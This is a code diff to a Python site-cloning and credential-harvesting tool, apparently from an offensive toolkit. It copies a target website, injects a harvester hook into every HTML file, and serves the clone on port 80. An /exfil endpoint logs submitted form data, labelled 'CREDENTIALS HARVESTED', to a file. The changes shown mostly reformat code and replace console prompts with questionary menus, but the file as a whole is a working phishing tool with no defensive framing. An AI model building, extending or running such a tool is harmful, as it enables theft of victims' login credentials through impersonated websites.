@@ -4,6 +4,7 @@ import logging
 import sys
 import time
 import requests
+import questionary
 
 # --- START COMPATIBILITY SHIM FOR PYTHON 3.13+ ---
 try:
@@ -19,6 +20,7 @@ from flask import Flask, request, send_from_directory
 from pywebcopy import save_webpage
 from rich.console import Console
 from rich.panel import Panel
+from core.ui import draw_header, Q_STYLE
 
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
@@ -27,19 +29,23 @@ console = Console()
 app = Flask(__name__)
 BASE_CLONE_PATH = "/opt/davoid/clones"
 
+
 @app.route('/exfil', methods=['POST'])
 def exfil():
     try:
         data = request.form.to_dict()
         client_ip = request.remote_addr
-        console.print(Panel(f"[bold red]CREDENTIALS HARVESTED[/bold red]\n[yellow]IP:[/yellow] {client_ip}\n[yellow]Data:[/yellow] {data}", title="Exfiltration Event", border_style="red"))
-        
-        if not os.path.exists("logs"): os.makedirs("logs")
+        console.print(Panel(
+            f"[bold red]CREDENTIALS HARVESTED[/bold red]\n[yellow]IP:[/yellow] {client_ip}\n[yellow]Data:[/yellow] {data}", title="Exfiltration Event", border_style="red"))
+
+        if not os.path.exists("logs"):
+            os.makedirs("logs")
         with open("logs/harvested.txt", "a") as f:
             f.write(f"--- {time.ctime()} | {client_ip} ---\n{data}\n\n")
         return "OK", 200
     except Exception as e:
         return str(e), 500
+
 
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
@@ -50,11 +56,13 @@ def serve_clone(path):
         return send_from_directory(directory, 'index.html')
     return send_from_directory(directory, path)
 
+
 def run_server():
     try:
         app.run(host='0.0.0.0', port=80, debug=False, threaded=True)
     except Exception as e:
         console.print(f"[bold red][!] Server Failure: {e}[/bold red]")
+
 
 def inject_hook(directory):
     """Deep search for any HTML file and inject the harvester hook."""
@@ -92,16 +100,24 @@ def inject_hook(directory):
                     with open(target_path, "w", encoding="utf-8") as f:
                         f.write(content)
                     found = True
-                except: continue
+                except:
+                    continue
     return found
+
 
 def clone_site():
     if os.getuid() != 0:
         return console.print("[red][!] Error: Root privileges required for Port 80.[/red]")
 
     draw_header("Site Cloner & Harvester")
-    target_url = console.input("[bold yellow]Target URL: [/bold yellow]").strip()
-    project_name = console.input("[bold yellow]Project Name: [/bold yellow]").strip()
+    target_url = questionary.text("Target URL:", style=Q_STYLE).ask()
+    if not target_url:
+        return
+
+    project_name = questionary.text(
+        "Project Name (Folder):", style=Q_STYLE).ask()
+    if not project_name:
+        return
 
     full_project_path = os.path.join(BASE_CLONE_PATH, project_name)
     if not os.path.exists(full_project_path):
@@ -117,26 +133,28 @@ def clone_site():
             project_name=project_name,
             bypass_robots=True,
             debug=False,
-            open_in_browser=False # Fixes the UserWarning
+            open_in_browser=False
         )
     except Exception as e:
         console.print(f"[red][!] PyWebCopy failed: {e}[/red]")
 
     # FALLBACK: If index.html is missing, manually pull the home page
-    # PyWebCopy often nests things inside a folder named after the URL
-    domain_folder = target_url.replace("https://", "").replace("http://", "").split('/')[0]
+    domain_folder = target_url.replace(
+        "https://", "").replace("http://", "").split('/')[0]
     potential_index_dir = os.path.join(full_project_path, domain_folder)
-    
+
     # Check if the folder exists, if not, create it for manual fallback
     if not os.path.exists(potential_index_dir):
         os.makedirs(potential_index_dir)
 
     index_file = os.path.join(potential_index_dir, "index.html")
-    
+
     if not os.path.exists(index_file):
-        console.print("[yellow][!] Index not found. Attempting manual recovery...[/yellow]")
+        console.print(
+            "[yellow][!] Index not found. Attempting manual recovery...[/yellow]")
         try:
-            r = requests.get(target_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
+            r = requests.get(target_url, headers={
+                             'User-Agent': 'Mozilla/5.0'}, timeout=10)
             with open(index_file, "w", encoding="utf-8") as f:
                 f.write(r.text)
             console.print("[green][+] Manual recovery successful.[/green]")
@@ -145,24 +163,30 @@ def clone_site():
 
     # Inject into all found HTML files
     if inject_hook(full_project_path):
-        console.print("[green][+] Harvester hook injected successfully.[/green]")
+        console.print(
+            "[green][+] Harvester hook injected successfully.[/green]")
     else:
         return console.print("[red][!] Failed to inject hook into any HTML files.[/red]")
 
-    if console.input("\n[bold cyan]Start Harvest Server? (y/N): [/bold cyan]").lower() == 'y':
+    if questionary.confirm("Start Harvest Server on Port 80?", default=True, style=Q_STYLE).ask():
         # Change directory to where index.html actually is
         os.chdir(potential_index_dir)
         threading.Thread(target=run_server, daemon=True).start()
-        
-        console.print(Panel(f"Portal active: [bold green]http://{requests.get('https://api.ipify.org').text}[/bold green]\nTargeting: {target_url}", title="Success", border_style="green"))
-        
+
         try:
-            while True: time.sleep(1)
+            public_ip = requests.get('https://api.ipify.org').text
+        except:
+            public_ip = "Unknown"
+
+        console.print(Panel(
+            f"Portal active: [bold green]http://{public_ip}[/bold green]\nTargeting: {target_url}", title="Success", border_style="green"))
+
+        try:
+            while True:
+                time.sleep(1)
         except KeyboardInterrupt:
             console.print("\n[yellow][-] Server stopped.[/yellow]")
 
-def draw_header(title):
-    console.print(Panel(f"[bold white]{title}[/bold white]", expand=False, border_style="cyan"))
 
 if __name__ == "__main__":
     clone_site()
